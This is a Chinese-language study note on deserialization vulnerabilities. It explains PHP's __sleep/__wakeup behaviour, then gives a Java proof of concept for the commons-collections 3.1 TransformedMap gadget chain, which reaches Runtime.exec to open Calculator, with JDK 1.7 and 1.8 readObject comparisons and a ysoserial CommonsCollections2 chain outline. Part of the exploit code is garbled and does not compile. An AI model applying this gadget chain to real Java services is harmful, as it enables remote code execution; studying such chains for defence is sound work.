# PHP 反序列化

PHP中序列化一个对象需要调用serialize()方法，之后会调用__sleep()方法执行自定义操作后，序列化数据生成，而JAVA的wrireObject()是可以重写的。反序列化后会调用__wakeup()方法。

PHP中的魔术方法__sleep(),__wakeup()是在序列化操作的前后执行而不是序列化时。

PHP反序列化漏洞的利用点是在序列化时将一些属性修改成我们想要的数据，从而在之后的执行流程中进行危险操作，而不是在__wakeup()中，因为根本不可控，除非__wakeup()本身写的很危险

# Java 反序列化

Java的反序列化和PHP的反序列化其实有些类似，都是将一个对象中的属性按照某种特定的格式生成一段数据流。
在反序列化的时候再按照这个格式将属性取出，再赋值给新的对象。


## commons-collections-3.1

### TransformedMap调用链

```java
    public static void main(String[] args) {
        String cmd  = "open /System/Applications/Calculator.app";
        String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{
                        "getRuntime", new Class[0]}
                ),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{
                        null, new Object[0]}
                ),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //chainedTransformer.transform(null);

        //创建AnnotationInvocationHandler对象 对map.class的动态代理对象
        Map map = new HashMap();

        map.put("value", "value");

        Map transformedMap = TransformedMap.decorate(map, null, chainedTransformer);

//        for (Object obj : transformedMap.entrySet()) {
//            Map.Entry entry = (Map.Entry) obj;
//
//            // setValue最终调用到InvokerTransformer的transform方法,从而触发Runtime命令执行调用链
//            entry.setValue("test");
//        }

        Class ann_clazz = Class.forName(ANN_INV_HANDLER_CLASS);

        // 获取AnnotationInvocationHandler类的构造方法
        Constructor constructor = ann_clazz.getDeclaredConstructor(Class.class, Map.class);

        // 设置构造方法的访问权限
        constructor.setAccessible(true);

        //AnnotationInvocationHandler类实例
        Object instance = constructor.newInstance(Target.class, transformedMap);

        // 创建用于存储payload的二进制输出流对象 创建Java对象序列化输出流对象
        ObjectOutputStream out = new ObjectOutputStream(new ByteArrayOutputStream());
        out.writeObject(instance);
        out.flush();
        out.close();

        byte[] bytes = baos.toByteArray();

        // 通过反序列化输入流(bais),创建Java对象输入流(ObjectInputStream)对象
        ObjectInputStream in = new ObjectInputStream(banew ByteArrayInputStream(bytes)is);

        in.readObject();
        in.close();

    }
}
```
> AnnotationInvocationHandler类是私有类，不能直接new出来。


调用TransformedMap的setValue/put/putAll中的任意方法都会调用InvokerTransformer类的transform方法，就会触发命令执行

- 可以触发此调用链的场景

 - 只要在Java的API中的任何一个类实现了java.io.Serializable接口
 - 可以传入构建的TransformedMap对象
 - 要有调用TransformedMap中的setValue/put/putAll中的任意方法一个方法的类
 - 在Java反序列化的时候触发InvokerTransformer类的transform方法实现RCE

 > 在jdk1.7u80中调用链可以顺利执行，jdk1.8中AnnotationInvocationHandler类的readobject()中没有调用entrty.setValue()方法。无法执行，代码如下。


- 1.7
```java
private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
        var1.defaultReadObject();
        AnnotationType var2 = null;

        try {
            var2 = AnnotationType.getInstance(this.type);
        } catch (IllegalArgumentException var9) {
            throw new InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map var3 = var2.memberTypes();
        Iterator var4 = this.memberValues.entrySet().iterator();

        while(var4.hasNext()) {
            Entry var5 = (Entry)var4.next();
            String var6 = (String)var5.getKey();
            Class var7 = (Class)var3.get(var6);
            if (var7 != null) {
                Object var8 = var5.getValue();
                if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
                    //这里调用的setValue()->checkSetValue()->valueTransformer.transform(value)
                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));
                }
            }
        }

    }

```

- 1.8

```java
    private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
        GetField var2 = var1.readFields();
        Class var3 = (Class)var2.get("type", (Object)null);
        Map var4 = (Map)var2.get("memberValues", (Object)null);
        AnnotationType var5 = null;

        try {
            var5 = AnnotationType.getInstance(var3);
        } catch (IllegalArgumentException var13) {
            throw new InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map var6 = var5.memberTypes();
        LinkedHashMap var7 = new LinkedHashMap();

        String var10;
        Object var11;
        for(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) {
            Entry var9 = (Entry)var8.next();
            var10 = (String)var9.getKey();
            var11 = null;
            Class var12 = (Class)var6.get(var10);
            if (var12 != null) {
                var11 = var9.getValue();
                if (!var12.isInstance(var11) && !(var11 instanceof ExceptionProxy)) {
                    //zheli 
                    var11 = (new AnnotationTypeMismatchExceptionProxy(var11.getClass() + "[" + var11 + "]")).setMember((Method)var5.members().get(var10));
                }
            }
        }

        AnnotationInvocationHandler.UnsafeAccessor.setType(this, var3);
        AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(this, var7);
    }
```

### LazyMap调用链 ysoserial-CommonsCollections1 

后半段执行命令的利用链和上面的一致，不同的是触发方式 

## commons-collections4:4.0

ysoserial CommonsCollections2调用链

```java
/*
	Gadget chain:
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				...
					TransformingComparator.compare()
						InvokerTransformer.transform()
							Method.invoke()
								Runtime.exec()
 */
```